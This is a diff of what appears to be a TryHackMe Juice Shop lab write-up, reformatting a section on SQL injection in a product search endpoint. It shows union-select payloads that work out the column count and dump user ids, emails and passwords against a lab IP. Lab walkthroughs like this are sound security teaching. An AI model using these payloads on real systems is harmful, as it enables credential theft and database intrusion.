@@ -62,25 +62,20 @@ http://10.10.118.46/rest/product/search?q=test
 <br/>
 
 You can perform a sqli here with the syntax
-```
-http://10.10.118.46/rest/product/search?q=test')) union select * from users;--
-```
+**http://10.10.118.46/rest/product/search?q=test')) union select * from users;--**
 <img src="../assets/img/thm/juiceshop/sqli3.png">
 <br/>
 
 We can see from normal use of the endpoint that the returned table has 8 collumns ('id', 'name', 'description', 'price', 'image', 'createdAt', 'updatedAt', 'deletedAt')
 <br/>
 
-```
-http://10.10.118.46/rest/product/search?q=test')) union select 'id', 'name', 'description', 'price', 'image', 'createdAt', 'updatedAt', 'deletedAt--
-```
+**http://10.10.118.46/rest/product/search?q=test')) union select 'id', 'name', 'description', 'price', 'image', 'createdAt', 'updatedAt', 'deletedAt--**
 <img src="../assets/img/thm/juiceshop/restapi2.png">
 <br/>
 
 From here we can dump whatever we want from the database presuming we know the table and collumn names.  From the previous test, we at least know that the users table exists.
-```
-http://10.10.118.46/rest/product/search?q=test')) union select 'id', 'name', 'description', 'price', 'image', id, email, password from users--
-```
+
+**http://10.10.118.46/rest/product/search?q=test')) union select 'id', 'name', 'description', 'price', 'image', id, email, password from users--**
 <img src="../assets/img/thm/juiceshop/userdump.png">
 <br/>
 
